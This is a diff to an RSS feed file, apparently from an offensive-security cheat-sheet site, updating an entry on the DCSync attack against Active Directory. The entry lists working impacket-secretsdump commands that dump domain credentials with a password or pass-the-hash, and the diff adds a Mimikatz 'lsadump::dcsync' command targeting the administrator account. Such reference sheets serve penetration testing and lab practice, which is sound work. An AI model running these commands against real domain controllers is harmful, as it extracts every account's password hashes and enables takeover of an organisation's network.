@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/getchanges_getchangesall/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/getchanges_getchangesall/</guid>
-      <description> GetChanges/GetChangesAll DCSync Attack (From Linux) # With creds impacket-secretsdump -just-dc username:password@10.10.11.10 # With hashes impacket-secretsdump -hashes lmhash:nthash -just-dc EXAMPLE.COM/username@10.10.11.10 </description>
+      <description> GetChanges/GetChangesAll DCSync Attack (From Linux) # With creds impacket-secretsdump -just-dc username:password@10.10.11.10 # With hashes impacket-secretsdump -hashes lmhash:nthash -just-dc EXAMPLE.COM/username@10.10.11.10 Mimikatz (From Windows) .\mimikatz.exe &amp;#39;lsadump::dcsync /domain:EXAMPLE.COM /user:administrator&amp;#39; exit </description>
     </item>
   </channel>
 </rss>
